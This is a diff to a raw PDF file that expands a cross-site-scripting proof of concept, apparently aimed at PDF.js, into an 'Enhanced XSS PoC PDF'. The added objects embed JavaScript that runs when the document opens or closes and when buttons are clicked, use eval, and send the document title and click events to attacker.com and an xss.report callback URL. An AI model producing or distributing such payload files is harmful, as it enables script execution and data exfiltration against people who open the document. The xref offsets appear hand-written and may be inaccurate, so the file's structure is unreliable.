@@ -1,12 +1,12 @@
 %PDF-1.4
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /OpenAction 11 0 R /Metadata 16 0 R >>
+<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /OpenAction 11 0 R /AcroForm << /Fields [18 0 R 19 0 R] >> /Metadata 16 0 R /AA 20 0 R >>
 endobj
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [17 0 R] >>
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [17 0 R 18 0 R 19 0 R] >>
 endobj
 4 0 obj
 << /Length 44 >>
@@ -28,10 +28,16 @@ endobj
 << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
 10 0 obj
-<< /Names [(XSSPayload) 11 0 R] >>
+<< /Names [(XSSPayload1) 11 0 R (XSSPayload2) 12 0 R (XSSPayload3) 13 0 R] >>
 endobj
 11 0 obj
-<< /S /JavaScript /JS (alert('XSS PoC via PDF.js CVE-2024-4367');) >>
+<< /S /JavaScript /JS (app.launchURL('https://xss.report/c/ghostshell', true);) >>
+endobj
+12 0 obj
+<< /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.com/log?data=' + app.doc.title, true); xhr.send();) >>
+endobj
+13 0 obj
+<< /S /JavaScript /JS (eval('var msg = "XSS PoC via eval()"; app.alert(msg);');) >>
 endobj
 16 0 obj
 << /Type /Metadata /Subtype /XML /Length 92 >>
@@ -39,7 +45,7 @@ stream
 <?xml version="1.0"?>
 <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
   <rdf:Description>
-    <dc:title>XSS PoC PDF</dc:title>
+    <dc:title>Enhanced XSS PoC PDF</dc:title>
   </rdf:Description>
 </rdf:RDF>
 endstream
@@ -47,8 +53,17 @@ endobj
 17 0 obj
 << /Type /Annot /Subtype /Link /Rect [100 400 200 420] /A << /S /URI /URI (https://gotphp.com/) >> /Border [0 0 1] /C [0 0 1] >>
 endobj
+18 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (XSSButton1) /Rect [150 500 250 520] /A << /S /JavaScript /JS (getURL('https://attacker.com/log?click=button1', true); app.alert('XSS via Button 1');) >> >>
+endobj
+19 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (XSSButton2) /Rect [150 450 250 470] /A << /S /JavaScript /JS (app.alert('XSS via Button 2'); eval('app.alert("Nested XSS via eval()");');) >> >>
+endobj
+20 0 obj
+<< /WC << /S /JavaScript /JS (app.alert('XSS PoC on Document Close');) >> >>
+endobj
 xref
-0 18
+0 21
 0000000000 65535 f 
 0000000010 00000 n 
 0000000095 00000 n 
@@ -61,14 +76,17 @@ xref
 0000000000 65535 f 
 0000000519 00000 n 
 0000000554 00000 n 
+0000000641 00000 n 
+0000000728 00000 n 
 0000000000 65535 f 
-0000000000 65535 f 
-0000000000 65535 f 
-0000000681 00000 n 
-0000000773 00000 n 
-0000000865 00000 n 
+0000000815 00000 n 
+0000000907 00000 n 
+0000000999 00000 n 
+0000001091 00000 n 
+0000001193 00000 n 
+0000001295 00000 n 
 trailer
-<< /Size 18 /Root 1 0 R >>
+<< /Size 21 /Root 1 0 R >>
 startxref
-957
+1393
 %%EOF
